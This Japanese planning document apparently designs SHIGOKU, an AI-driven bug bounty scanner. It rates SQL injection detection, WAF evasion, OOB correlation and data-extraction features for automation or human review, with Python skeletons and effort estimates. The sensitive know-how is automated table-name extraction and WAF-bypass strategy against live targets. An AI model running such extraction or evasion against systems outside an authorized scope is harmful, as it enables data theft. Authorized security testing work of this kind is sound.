| カテゴリ | 対象例 | 用途 | 備考 |
|---------|--------|------|------|
| **学習用** | DVWA, Juice Shop, WebGoat | 検証 | 既知の脆弱性 |
| **CTF** | HackTheBox, TryHackMe | スキル向上 | 実務的シナリオ |
| **プラットフォーム** | HackerOne, Bugcrowd | 実際の報酬 | ルール遵守必須 |
| **オープンソース** | WordPressプラグイン等 | 実務 | コードレビュー併用 |

※本計画書は特定アプリケーションに依存せず、Bug Bounty対象Webアプリケーション全体で成果を最大化する汎用設計です。

---

## 15. トップBug Bountyハンター観点：SQLi機能のVer.1実装評価

### 15.1 評価基準

トップBug Bountyハンター（年間$100K+獲得）の観点から、以下の基準でSQLi機能を評価：

| 評価軸 | 説明 |
|-------|------|
| **賞金獲得可能性** | 実際にBug Bounty報告として受理され、報酬が支払われる可能性 |
| **AI自動化難易度** | 人手なしで正確に判断・実行できるか |
| **実装複雑度** | 技術的に実装が複雑で、工期が長くなるか |
| **偽陽性リスク** | 自動化時に偽陽性（誤検出）が発生するリスク |

### 15.2 SQLi機能分類マトリクス

#### ✅ Ver.1でAI単独実装（自動化）可能

| 機能 | 賞金獲得可能性 | AI自動化難易度 | 実装複雑度 | 偽陽性リスク | Ver.1方針 |
|-----|-------------|--------------|-----------|-------------|----------|
| **Error-based SQLi検出** | ⭐⭐⭐⭐⭐ 最高 | 低（エラーメッセージパターンマッチ） | 低 | 低 | **AI自動実装** |
| **Union-based検出（エラー応答あり）** | ⭐⭐⭐⭐⭐ 最高 | 低（データ構造変化検出） | 低 | 中 | **AI自動実装** |
| **DBMS指紋（基本）** | ⭐⭐⭐⭐ 高 | 低（@@version等標準クエリ） | 低 | 低 | **AI自動実装** |
| **NoSQLi（標準パターン）** | ⭐⭐⭐⭐ 高 | 中（JSON構造の理解必要） | 中 | 中 | **AI自動実装** |
| **WAFブロック検出** | ⭐⭐⭐ 中 | 低（HTTPステータス/レスポンスパターン） | 低 | 低 | **AI自動実装** |

#### ⚠️ Ver.1でHITL（人間介入）必要

| 機能 | 賞金獲得可能性 | AI自動化難易度 | 実装複雑度 | 偽陽性リスク | Ver.1方針 |
|-----|-------------|--------------|-----------|-------------|----------|
| **Time-based盲検（SLEEP）** | ⭐⭐⭐⭐⭐ 最高 | 高（ネットワーク遅延変動との区別） | 中 | 高 | **HITL確認** |
| **Boolean-based盲検** | ⭐⭐⭐⭐⭐ 最高 | 高（True/False差分の統計的判断） | 高 | 高 | **HITL確認** |
| **OOB（DNS/HTTP外挿）** | ⭐⭐⭐⭐⭐ 最高 | 高（相関判定・タイムアウト管理） | 中 | 中 | **HITL確認** |
| **データ抽出（テーブル/データ）** | ⭐⭐⭐⭐⭐ 最高 | 高（抽出工数判断・スコープ確認） | 中 | 高 | **HITL判断** |
| **WAF回避戦略選択** | ⭐⭐⭐⭐ 高 | 高（ターゲット依存の最適戦略） | 高 | 高 | **HITL選択** |
| **Second-Order候補特定** | ⭐⭐⭐⭐⭐ 最高 | 高（データフロー推定・信頼度判断） | 高 | 高 | **HITL確認** |

#### ❌ Ver.1でスコープ外（Ver.2検討）

| 機能 | 賞金獲得可能性 | AI自動化難易度 | 実装複雑度 | 偽陽性リスク | Ver.1方針 |
|-----|-------------|--------------|-----------|-------------|----------|
| **Second-Order SQLi完全自動化** | ⭐⭐⭐⭐⭐ 最高 | 极高（ステート管理・マルチステップ） | 极高 | 极高 | **Ver.2検討** |
| **分散SQLi（マイクロサービス間）** | ⭐⭐⭐⭐ 高 | 极高（分散トレース前提が非現実的） | 极高 | 极高 | **Ver.2検討** |
| **カートesian積DoS検出** | ⭐⭐⭐ 中 | 高（副作用ベース・統計的判断） | 高 | 极高 | **Ver.2検討** |
| **暗号化カラム検出補償** | ⭐⭐⭐ 中 | 极高（bcrypt等の遅延との区別） | 高 | 极高 | **Ver.2検討** |
| **完全自動WAFエバージョン** | ⭐⭐⭐⭐ 高 | 极高（ターゲット固有学習必要） | 极高 | 极高 | **Ver.2検討** |

### 15.3 機能別詳細評価と根拠

#### ✅ Error-based SQLi検出（AI自動実装）

```python
# 実装例: AI単独で完結
class ErrorBasedDetector:
    ERROR_PATTERNS = {
        'mysql': [
            r"You have an error in your SQL syntax",
            r"Warning: mysql_",
            r"MySQL server version",
        ],
        'postgresql': [
            r"ERROR: syntax error at or near",
            r"PostgreSQL query failed",
        ],
        'mssql': [
            r"Microsoft SQL Server",
            r"Unclosed quotation mark",
        ],
        'sqlite': [
            r"SQLite3::SQLException",
            r"near .*: syntax error",
        ],
    }
    
    async def detect(self, response: Response) -> Finding:
        for db_type, patterns in self.ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return SQLiFinding(
                        type="Error-based",
                        db_type=db_type,
                        evidence=response.text[:500],
                        confidence=0.95,  # 高信頼度
                        auto_confirmed=True  # AI単独で確定
                    )
```

**根拠**: エラーメッセージのパターンマッチは決定的。偽陽性リスク極めて低い。人手確認不要。

---

#### ⚠️ Time-based盲検（HITL確認）

```python
# 実装例: AI検出→人間確認
class TimeBasedDetector:
    async def detect(self, param: Param) -> DetectionResult:
        # AIが候補を検出
        baseline = await self.measure_baseline(param)
        
        for payload in self.SLEEP_PAYLOADS:
            start = time.time()
            await self.inject(param, payload)
            elapsed = time.time() - start
            
            # AIが「候補」を特定（信頼度70%）
            if elapsed > baseline * 2:
                return DetectionResult(
                    status="CANDIDATE",  # 候補のみ
                    confidence=0.70,
                    requires_human_confirmation=True,  # HITL必須
                    evidence={
                        "baseline": baseline,
                        "elapsed": elapsed,
                        "payload": payload,
                    },
                    # 人間への提示情報
                    human_prompt=f"""
                    Time-based SQLi候補検出:
                    - 通常応答時間: {baseline:.2f}s
                    - ペイロド注入後: {elapsed:.2f}s
                    - 使用ペイロド: {payload}
                    
                    判断依頼:
                    1. ネットワーク遅延の可能性は排除できましたか？
                    2. 同じペイロドを再度試行して遅延が再現しますか？
                    3. この脆弱性をBug Bounty報告に値しますか？
                    
                    [CONFIRM] 脆弱性確定 / [REJECT] 誤検出 / [RETRY] 再試行
                    """
                )
```

**根拠**: ネットワーク遅延との区別が統計的に困難。単発の遅延では偽陽性が高い（30%+）。人手による再試行・判断が必要。

---

#### ⚠️ データ抽出工数判断（HITL判断）

```python
# 実装例: AIが候補提示→人間が抽出判断
class DataExtractionAdvisor:
    async def advise_extraction(self, confirmed_sqli: Finding) -> ExtractionAdvice:
        # 基本情報を自動収集（AI単独）
        basic_info = await self.extract_basic_info(confirmed_sqli)
        
        # テーブル一覧を取得（低リスク・自動化可能）
        tables = await self.extract_table_names(confirmed_sqli, limit=10)
        
        # 人間への提示
        return ExtractionAdvice(
            auto_extracted=basic_info,  # AIが既に取得済み
            requires_human_decision=True,
            
            # 人間への判断材料
            analysis={
                "db_type": basic_info.db_type,
                "estimated_tables": len(tables),
                "sample_tables": tables[:5],
                "estimated_extraction_time": self.estimate_time(tables),
            },
            
            # 判断依頼
            human_prompt=f"""
            SQLiが確認されました。データ抽出の判断を求めます:
            
            [自動収集済み情報]
            - DBMS: {basic_info.db_type}
            - ユーザー: {basic_info.user}
            - バージョン: {basic_info.version}
            - 検出テーブル数: {len(tables)}
            - テーブル例: {', '.join(tables[:5])}
            
            [抽出工数見積もり]
            - 全テーブル構造取得: ~{self.estimate_time(tables)}分
            - サンプルデータ抽出: ~{len(tables) * 2}分
            
            [判断選択肢]
            A) 基本情報のみで報告（推奨: 工数最小）
            B) テーブル構造のみ追加取得
            C) サンプルデータも抽出（admin/user等優先）
            D) 全面抽出（高報酬期待時のみ）
            
            選択: [A/B/C/D]
            """
        )
```

**根拠**: Bug Bountyでは「どこまで抽出するか」が報酬に直結。過度な抽出はスコープ違反リスク。AIは工数見積もりまで提示し、人的判断が必要。

---

#### ❌ Second-Order SQLi完全自動化（Ver.2検討）

```python
# Ver.1: 人間が手動実施
# Ver.2: 以下の自動化を検討

class SecondOrderSQLiDetector_Ver2:
    """
    Ver.2で検討する機能:
    - 自動保存→表示エンドポイント特定
    - ペイロド自動注入（保存系）
    - 遅延自動検出（表示系巡回）
    - 相関自動判定
    
    Ver.1で保留の理由:
    1. ステート管理が複雑（保存状態の追跡）
    2. エンドポイント間のデータフロー推定が困難
    3. 検出に数分〜数時間かかり、リアルタイム判断必要
    4. 偽陽性が高く、人手確認が必須の状況が続く
    """
    pass
```

**根拠**: Second-Orderは「最も報酬が高いカテゴリ」だが、自動化が極めて困難。ステートフルなマルチステップ検出は工数12h+。Ver.1では「人間が手動で検出」し、Ver.2で自動化検討。

### 15.4 Ver.1実装スコープ（確定）

```
┌─────────────────────────────────────────────────────────────┐
│                    Ver.1 SQLi実装スコープ                     │
├─────────────────────────────────────────────────────────────┤
│  【AI単独実装】                                               │
│  ✅ Error-based SQLi検出                                      │
│  ✅ Union-based検出（エラー応答あり）                         │
│  ✅ DBMS基本指紋（version/user/database）                    │
│  ✅ NoSQLi標準パターン                                        │
│  ✅ WAFブロック検出                                           │
│  ✅ テーブル名一覧取得（自動）                                │
├─────────────────────────────────────────────────────────────┤
│  【AI検出 + HITL確認】                                        │
│  ⚠️ Time-based盲検（候補検出→人間確認）                      │
│  ⚠️ Boolean-based盲検（候補検出→人間確認）                  │
│  ⚠️ OOB検出（候補検出→人間確認）                            │
│  ⚠️ データ抽出範囲判断（AI提示→人間決定）                    │
│  ⚠️ WAF回避戦略選択（AI提示→人間選択）                      │
│  ⚠️ Second-Order候補提示（AI推定→人間手動検証）              │
├─────────────────────────────────────────────────────────────┤
│  【Ver.2検討】将来の拡張設計は残す                            │
│  ❌ Second-Order完全自動化                                    │
│  ❌ 分散SQLi検出                                              │
│  ❌ 完全自動WAFエバージョン（ML学習）                        │
│  ❌ 暗号化カラム検出補償                                      │
└─────────────────────────────────────────────────────────────┘
```

### 15.5 HITL設計詳細（Ver.1）

| HITLポイント | AIの役割 | 人間の役割 | 判断時間目安 | 将来自動化可能性 |
|-------------|---------|-----------|-------------|----------------|
| Time-based確認 | 候補検出・統計提示 | 再試行判断・確定 | 5分 | 高（統計的閾値確立後） |
| Boolean-based確認 | 差分検出・パターンマッチ | 信頼度判断・確定 | 10分 | 中（機械学習必要） |
| OOB確認 | 相関ID管理・タイムアウト制御 | コールバック確認・確定 | 3分 | 高（基盤完成後） |
| データ抽出判断 | 工数見積もり・リスク提示 | 範囲選択 | 5分 | 低（倫理的判断必要） |
| WAF回避選択 | 戦略候補提示・成功率予測 | 戦略選択 | 3分 | 中（実績蓄積後） |
| Second-Order推定 | データフロー推定・信頼度提示 | 手動検証実行・確定 | 30分 | 低（複雑すぎる） |

### 15.6 将来拡張設計（Ver.2準備）

```python
# Ver.1でインターフェースのみ定義（実装はVer.2）

from abc import ABC, abstractmethod

class ISecondOrderDetector(ABC):
    """Ver.2で実装予定: Second-Order SQLi自動検出"""
    
    @abstractmethod
    async def identify_storage_endpoints(self, target: Target) -> List[Endpoint]:
        """保存系エンドポイント特定"""
        pass
    
    @abstractmethod
    async def identify_display_endpoints(self, target: Target) -> List[Endpoint]:
        """表示系エンドポイント特定"""
        pass
    
    @abstractmethod
    async def correlate_injection(self, storage: Endpoint, display: Endpoint) -> bool:
        """保存→表示の相関判定"""
        pass

class IDistributedSQLiDetector(ABC):
    """Ver.2で実装予定: 分散SQLi自動検出"""
    
    @abstractmethod
    async def build_call_graph(self, entry: Endpoint) -> CallGraph:
        """サービス間呼び出しグラフ構築"""
        pass
    
    @abstractmethod
    async def detect_in_service(self, endpoint: Endpoint) -> List[Finding]:
        """個別サービス内検出"""
        pass

class IMLWAFEvasion(ABC):
    """Ver.2で実装予定: MLベースWAF回避"""
    
    @abstractmethod
    async def train(self, success_patterns: List[Dict]):
        """過去の成功パターン学習"""
        pass
    
    @abstractmethod
    async def predict_strategy(self, waf_type: str, context: Dict) -> Strategy:
        """最適戦略予測"""
        pass
```

### 15.7 推奨実装順序（ROI優先）

```
Week 1-2（Phase D-1）基盤構築:
├── D1-1 Infrastructure Layer（含: HITLフレームワーク）
└── D1-2 Observability基盤

Week 3-4（Phase D-2）検出エンジン:
├── D2-1 SQLi Detection Engine（Error-based: AI単独）
├── D2-2 XSS Detection Engine
├── D2-3 WAF Evasion Engine（AI提示→HITL選択）
└── D2-4 OOB Correlation Engine（AI検出→HITL確認）

Week 5-6（Phase D-2後半）HITL強化:
├── Time-based HITLワークフロー
├── Boolean-based HITLワークフロー
├── データ抽出HITL判断フロー
└── Second-Order候補提示（手動検証用）

Week 7-8（Phase D-3選択実装）:
├── D3-1 Second-Order自動化（Ver.2準備: インターフェース定義のみ）
└── D3-2 ML Evasion（Ver.2準備: データ収集基盤のみ）
```

### 15.8 結論

**Ver.1でのSQLi実装方針**:

1. **高ROI・確実**: Error-based/Union-basedはAI単独で実装
2. **高ROI・判断困難**: Time-based/Boolean-based/OOBはAI検出→HITL確認
3. **极高ROI・実装困難**: Second-Order/分散SQLiは人間手動（AIは候補提示のみ）
4. **将来拡張**: 複雑な機能はインターフェースのみ定義し、Ver.2で実装検討

この方針により、Ver.1で「賞金獲得可能なSQLi検出」を実現しつつ、過度な自動化リスクを回避する。

---

## 16. コーディングCTO観点：詳細技術評価

評価者プロフィール: 年間$150K+ Bug Bounty獲得 + 元SRE + スタートアップCTO経験 + 大規模セキュリティツール開発経験

### 16.1 評価軸の定義

| 評価軸 | 説明 | 重み |
|-------|------|------|
| **実現性（Feasibility）** | 技術的に実装可能か、既存コードベースとの親和性 | 30% |
| **実装難易度（Complexity）** | 工数見積もりの妥当性、技術的ハードルの高さ | 25% |
| **コンセプト整合性（Concept Fit）** | SHIGOKUの「AI駆動Bug Bounty自動化」目的との合致度 | 25% |
| **投資対効果（ROI）** | 実装コストに対するBug Bounty成果期待値 | 20% |

### 16.2 Phase D-1 機能評価（基盤構築）

#### D1-1: Infrastructure Layer構築

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐⭐ 5/5 | Pythonの`asyncio` + `aioredis`で十分実現可能。DIコンテナは`dependency-injector`ライブラリで1日で構築可能。 |
| **実装難易度** | ⭐⭐⭐☆☆ 3/5 | 工数8hは妥当。ただしConnectionPoolの設計で「FD上限」「接続タイムアウト」「リトライ」の3軸管理が必要で、経験者でも1.5日かかる。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | SHIGOKUのスケーラビリティ要件に直結。大規模ターゲット（10,000+パラメータ）での動作保証に必須。 |
| **ROI** | ⭐⭐⭐⭐☆ 4/5 | 基盤投資は見返りが長期的。ただしFD枯渇によるクラッシュを防ぎ、スキャン継続率向上には貢献。 |

**総合評価**: 4.25/5
**推奨**: 最優先実装。ただし工数は12h（1.5日）に見直し。

```python
# CTO推奨の実装アプローチ
class InfrastructureLayer:
    """
    実装上の注意点（経験則から）:
    1. ConnectionPoolは「上限」ではなく「動的調整」が重要
       - 10,000パラメータ時: 並列100 → 実際は50程度に自動抑制
       - 測定: FD使用量80%で新規接続キューイング
    
    2. DI Containerは「過度に抽象化しない」
       - 現実: 80%のケースで直接インスタンス化で十分
       - 必要なのは「テスト時の差替」だけ
       - Registryパターンで十分、フルDIは過剰
    
    3. TokenRefreshのLock機制は「非同期Lock」
       - asyncio.Lock()で十分
       - 注意: リフレッシュ失敗時のフォールバック必須
    """
```

---

#### D1-2: Observability基盤実装

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | Prometheus連携は容易。ただしExecutionTracerの「1000リクエスト保持」はメモリ圧迫リスク。 |
| **実装難易度** | ⭐⭐⭐☆☆ 3/5 | 工数6hは楽観的。シード付き乱数は`random.seed()`でOKだが、network_emulatorは`tc`コマンドラップで1日。 |
| **コンセプト整合性** | ⭐⭐⭐⭐☆ 4/5 | 可観測性は重要だが、SHIGOKUのコア価値（Bug Bounty検出）には間接的。 |
| **ROI** | ⭐⭐⭐☆☆ 3/5 | 再現性確保は重要だが、実際のBug Bountyでは「再現性」より「検出率」が優先。過度な投資は慎重に。 |

**総合評価**: 3.5/5
**推奨**: Phase D-1の後半で実装。メトリクス優先、トレースは簡易版から開始。

**気になる点**:
- `network_emulator`は実装コスト高（1日）に対して価値が不明確
- 実際のBug Bountyでは「本番ネットワーク」での検出が重要
- ローカルでの再現性は「デバッグ時」に有用だが、優先度は中

---

#### D1-3: Resilience機構実装

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐⭐ 5/5 | Circuit Breakerは`pybreaker`ライブラリで30分。CheckpointはRedis+`pickle`で1時間。 |
| **実装難易度** | ⭐⭐⭐☆☆ 3/5 | 工数6hは妥当。ただし「Checkpoint復旧時の状態整合性」が難問。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | 24時間スキャンの継続性に直結。Bug Bountyの「長期戦」に必須。 |
| **ROI** | ⭐⭐⭐⭐⭐ 5/5 | 1回のクラッシュリカバリで「数時間の再実行」を回避。即座に元が取れる。 |

**総合評価**: 4.5/5
**推奨**: 最優先実装。Checkpoint機能はBug Bounty実務で即価値。

```python
# Checkpoint設計の注意点（経験則）
class CheckpointManager:
    """
    実装上の落とし穴:
    1. 「全状態」を保存すると巨大化
       - 実際必要なのは「どのパラメータまで処理したか」だけ
       - レスポンスキャッシュ等は不要（再生性なし）
    
    2. RedisにPickle化したオブジェクトを保存
       - 注意: クラス構造変更時にデシリアライズ失敗
       - 対策: バージョン番号付きスキーマ
    
    3. Checkpoint間隔は「60秒」が最適？
       - 実際: Time-based盲検（300秒）時は不要
       - 短い検出（Error-based 1秒）時は有効
       - 動的調整: 最後の検出タイプに応じて変更
    """
```

---

#### D1-4: Generic Tool Adapter設計

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐⭐ 5/5 | Pythonの抽象基底クラスで簡潔に実現可能。 |
| **実装難易度** | ⭐⭐⭐⭐☆ 4/5 | 工数6hは妥当だが、ツール固有の「結果パース」が地獄。sqlmapのJSON出力は安定だが、dalfoxは頻繁に変更。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | FOSSツール統合はSHIGOKUのコア戦略。独自実装のコスト回避に必須。 |
| **ROI** | ⭐⭐⭐⭐⭐ 5/5 | 新ツール追加を「2時間」に短縮。10ツールで80時間削減。即座に元が取れる。 |

**総合評価**: 4.75/5
**推奨**: 最優先実装。ただし「ツール固有パーサー」は別タスクで切り出し。

**気になる点**:
```python
# 計画書のYAML定義は「理想」だが「現実は厳しい」
config/tools/sqlmap.yaml
name: sqlmap
binary: sqlmap
default_args: [--batch, --level=1]
parser: sqlmap_result_parser  # ← この行が問題

"""
問題点:
1. "parser: sqlmap_result_parser" は関数参照だが、YAMLで直接書くとインポート問題
2. 実際は「モジュールパス + 関数名」を文字列で書いて、動的インポートが必要
3. さらに問題: sqlmapのJSON出力はバージョンで変わる
   - v1.6: "data" キーあり
   - v1.7: "data" キーなし、"results" に変更
   - 実装後2ヶ月で破壊的変更が発生した経験あり

推奨:
- YAMLには「最小限のメタデータ」のみ
- パーサーは「バージョン付き」で複数保持
- パース失敗時は「フォールバックパーサー」で古い形式も試行
"""
```

---

#### D1-5: HITL Strategy Pattern基盤

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | Strategyパターンは実装容易。ただし「人間とのインターフェース」が難問。 |
| **実装難易度** | ⭐⭐⭐⭐☆ 4/5 | 工数4hは「楽観的」。実際は「人間への提示UI/CLI」で+8h。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | SHIGOKUの「検出 > 完全自動化」方針の核。人間判断を組み込む設計は正しい。 |
| **ROI** | ⭐⭐⭐⭐☆ 4/5 | 誤検出削減による手動工数削減に貢献。ただし「人間の応答待ち」でスループット低下リスク。 |

**総合評価**: 4.25/5
**推奨**: 実装するが、UI部分は簡易版から開始。

**気になる点**:
```python
# 計画書のHITL設計は「技術的に正しい」が「運用上の課題」が未記載

class HITLDecisionEngine:
    async def route(self, finding: Finding) -> HITLDecision:
        # 問題: 人間が3時間応答しない場合は？
        # 問題: 深夜のスキャンで人間がいない場合は？
        # 問題: 100件のHITLキューが溜まった場合は？
        pass

"""
運用上の現実:
1. 人間は「即応答」しない
   - 平均応答時間: 15分〜4時間（私の経験）
   - 深夜スキャン: 翌朝までブロック

2. キュー管理が必須
   - 100件のHITL待ちは現実的
   - 古いHITLは「タイムアウト」して自動スキップ

3. 非同期通知
   - Slack/Discordへの通知必須
   - モバイル対応（iOS/Androidアプリ）が理想

推奨:
- Ver.1: CLI上で「ブロッキング待機」
- Ver.2: Webダッシュボード + Slack連携
"""
```

---

#### D1-6: Testability基盤

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | `toxiproxy`等の既存ツールで代替可能。実装コストは低い。 |
| **実装難易度** | ⭐⭐⭐☆☆ 3/5 | 工数4hは妥当。ただし「MockWAF」は実際のWAF挙動と異なる可能性。 |
| **コンセプト整合性** | ⭐⭐⭐☆☆ 3/5 | テスト容易性は重要だが、SHIGOKUのコア価値にはやや外れる。 |
| **ROI** | ⭐⭐⭐☆☆ 3/5 | テスト自動化の長期的価値は高いが、Bug Bounty成果には間接的。 |

**総合評価**: 3.25/5
**推奨**: Phase D-2の後半で実装。MockWAFは簡易版から。

### 16.3 Phase D-2 機能評価（検出エンジン）

#### D2-1: SQLi Detection Engine

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | Error-basedは容易。Time-based/Boolean-basedは「統計的有意差検定」が難問。 |
| **実装難易度** | ⭐⭐⭐⭐⭐ 5/5 | 工数10hは「大幅に楽観的」。実際は25h（3日）。統計処理・ベースライン測定・外れ値除去で難解。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | SHIGOKUのコア機能。Bug Bounty成果に直結。 |
| **ROI** | ⭐⭐⭐⭐⭐ 5/5 | SQLiは最高報酬カテゴリ。投資に対する見返りが最大。 |

**総合評価**: 4.75/5
**推奨**: 最重要実装。ただし工数は25hに見直し、Phase D-2を1週間延長。

**気になる点**:
```python
# 「統計的有意差検定」の実装は「統計学者レベル」の難易度

class StatisticalBlindDetector:
    """
    計画書に記載された「統計的有意差検定」は簡単に聞こえるが...
    
    実際の難題:
    1. ベースライン測定の回数
       - 1回では不安定（ネットワーク遅延の影響）
       - 複数回測定が必要（推奨: 5回）
    
    2. 有意水準の設定
       - p < 0.05（95%信頼区間）では偽陽性が高い
       - p < 0.01（99%信頼区間）では検出率が低下
       - 最適値は経験的に決定（p < 0.005が現実的）
    
    3. 多重比較問題
       - 100パラメータで有意差検定 → 5件の偽陽性（p < 0.05）
       - Bonferroni補正が必要
    
    4. 分布の非正規性
       - ネットワーク遅延は「正規分布」ではない
       - 対数変換 or ノンパラメトリック検定（Mann-Whitney）が必要
    
    工数見積もり（実績ベース）:
    - 統計処理実装: 8h
    - ベースライン測定ロジック: 4h
    - パラメータチューニング: 8h
    - テスト（偽陽性検証）: 5h
    - 合計: 25h（3日）
    """
```

---

#### D2-2: XSS Detection Engine

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | DalFoxラップからの脱却是「理想論」。実際は「ラップ強化」が現実的。 |
| **実装難易度** | ⭐⭐⭐⭐☆ 4/5 | 工数8hは「独自エンジン開発」では不足。DalFoxラップ強化なら妥当。 |
| **コンセプト整合性** | ⭐⭐⭐⭐☆ 4/5 | XSS検出は重要だが、SHIGOKUの差別化ポイントにはなりにくい（既存ツールが充実）。 |
| **ROI** | ⭐⭐⭐⭐☆ 4/5 | XSSは中報酬カテゴリ。Reflectedは低報酬、Stored/DOMは高報酬。 |

**総合評価**: 4.0/5
**推奨**: DalFoxラップ強化で実装。独自エンジンはVer.2で検討。

---

#### D2-3: WAF Evasion Engine

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | WAFプロファイルは「経験則」で構築可能。ただし「自動最適化」は難問。 |
| **実装難易度** | ⭐⭐⭐⭐⭐ 5/5 | 工数8hは「絶対に不足」。実際は20h（2.5日）。ML統合なら+30h。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | 「WAF環境で検出できる」はSHIGOKUの差別化ポイント。 |
| **ROI** | ⭐⭐⭐⭐⭐ 5/5 | WAF突破は実務で極めて重要。競合他社との差別化に貢献。 |

**総合評価**: 4.5/5
**推奨**: 最優先実装。ただしML統合はPhase D-3に延期。

---

#### D2-4: OOB Correlation Engine

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐⭐☆ 4/5 | interactsh連携は実績あり。相関ID管理は標準的。 |
| **実装難易度** | ⭐⭐⭐☆☆ 3/5 | 工数6hは妥当。ただし「60秒待機」は固定ではなく動的調整が必要。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | Blind SQLi/SSRFの検出に必須。Bug Bounty高報酬カテゴリ。 |
| **ROI** | ⭐⭐⭐⭐⭐ 5/5 | OOB検出は「高報酬脆弱性」の鍵。投資に対する見返りが高い。 |

**総合評価**: 4.25/5
**推奨**: 優先実装。TTL管理は実装上の注意点。

---

### 16.4 Phase D-3 機能評価（高度機能）

#### D3-1: Second-Order SQLi Detection

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐☆☆ 3/5 | 「完全自動化」は技術的に未解決。学術研究レベルの難題。 |
| **実装難易度** | ⭐⭐⭐⭐⭐ 5/5 | 工数12hは「夢物語」。実際は60h（1.5週間）以上。 |
| **コンセプト整合性** | ⭐⭐⭐⭐⭐ 5/5 | Second-Orderは最高報酬カテゴリ。SHIGOKUの「差別化」に最適。 |
| **ROI** | ⭐⭐⭐⭐⭐ 5/5 | 1件のSecond-Order SQLi報告で$10,000+。投資に対する見返りが最大。 |

**総合評価**: 4.0/5（実現性で減点）
**推奨**: Ver.2で検討。Ver.1では「候補提示」まで。

---

#### D3-2: ML-based Adaptive Evasion

| 項目 | 評価 | 詳細 |
|-----|------|------|
| **実現性** | ⭐⭐⭐☆☆ 3/5 | 「学習データ」が不足。実績がない状態でのMLは「賭け」。 |
| **実装難易度** | ⭐⭐⭐⭐⭐ 5/5 | 工数10hは「絶対に不足」。MLパイプライン構築だけで20h。 |
| **コンセプト整合性** | ⭐⭐⭐⭐☆ 4/5 | ML統合は「未来的」だが、SHIGOKUの現状ニーズとはやずれる。 |
| **ROI** | ⭐⭐⭐☆☆ 3/5 | ML投資は長期的。Bug Bounty成果には「数ヶ月後」に反映。 |

**総合評価**: 3.25/5
**推奨**: Ver.2で検討。Ver.1では「データ収集基盤」のみ構築。

---

### 16.5 総合評価と推奨ロードマップ

#### 工数見積もり修正（CTO推奨）

| Phase | 計画書工数 | CTO推奨工数 | 差分 | 理由 |
|------|-----------|------------|------|------|
| D-1 | 34h | 42h | +8h | Infrastructure Layer +8h（ConnectionPool設計） |
| D-2 | 44h | 75h | +31h | SQLi Engine +15h、WAF Evasion +12h、他微調整 |
| D-3 | 最大54h | 最大90h | +36h | Second-Order +48h、ML +30h、但し選択実装 |
| **合計** | **132h** | **207h** | **+75h** | **約4週間（1ヶ月）に相当** |

#### 推奨ロードマップ（修正版）

```
【Week 1-2: Phase D-1 基盤構築】
優先順:
1. D1-3 Resilience（Checkpoint）← 即価値
2. D1-1 Infrastructure（DI + ConnectionPool）← スケーラビリティ
3. D1-4 Generic Tool Adapter ← 生産性向上
4. D1-5 HITL Strategy（簡易版） ← 誤検出削減
5. D1-2 Observability（メトリクスのみ） ← 後回し可
6. D1-6 Testability ← 後回し可

【Week 3-5: Phase D-2 検出エンジン】← 1週間延長
優先順:
1. D2-1 SQLi Engine（Error-based優先） ← 最高ROI
2. D2-4 OOB Correlation ← 高報酬カテゴリ
3. D2-3 WAF Evasion（ルールベース） ← 差別化
4. D2-2 XSS Engine（DalFoxラップ） ← 中ROI
5. D2-1 SQLi Engine（Time-based HITL版） ← 統計処理

【Week 6-8: Phase D-2.5 HITL強化】← 新設
新設タスク:
- Time-based HITLワークフロー実装
- Boolean-based HITLワークフロー実装
- データ抽出判断フロー実装
- スクリーンショット自動取得

【Week 9-12: Phase D-3 選択実装】← 条件付き
実装条件:
- Phase D-2検出率 >= 10% の場合のみ
- 優先: D3-3 CI/CD（運用自動化）
- 次点: D3-4 Proxy Integration（開発者体験向上）
- 保留: D3-1 Second-Order、D3-2 ML（Ver.2）
```

### 16.6 結論と推奨事項

**実現性**: 全機能は技術的に実現可能だが、工数見積もりは「楽観的」で実際は1.5倍〜2倍必要。

**実装難易度**: 
- 「基盤構築（D-1）」は標準的
- 「検出エンジン（D-2）」は統計処理・WAF回避で難問
- 「高度機能（D-3）」はSecond-Order/MLで「研究開発」レベル

**コンセプト整合性**: 
- ✅ 「Error-based + HITL」はSHIGOKUの方針に完全適合
- ⚠️ 「完全自動化」は現時点では非現実的
- ✅ 「検出 > 自動化」の方針は正しい

**気になる点**:
1. **工数過少見積もり**: 実際は計画書の1.5倍〜2倍必要
2. **統計処理の複雑さ**: Time-based盲検の「統計的有意差検定」は専門知識必要
3. **HITL運用設計**: 「人間が3時間応答しない」ケースの対応が未記載
4. **ML統合の時期**: 学習データ不足の段階でのMLは「時期尚早」

**推奨**:
- 工期を「2週間」→「4週間」に延長
- Phase D-3は「選択実装」で、Second-Order/MLはVer.2に延期
- 統計処理部分は「外部ライブラリ」活用（scipy.stats）
- HITLは「簡易版」から開始し、運用で学習

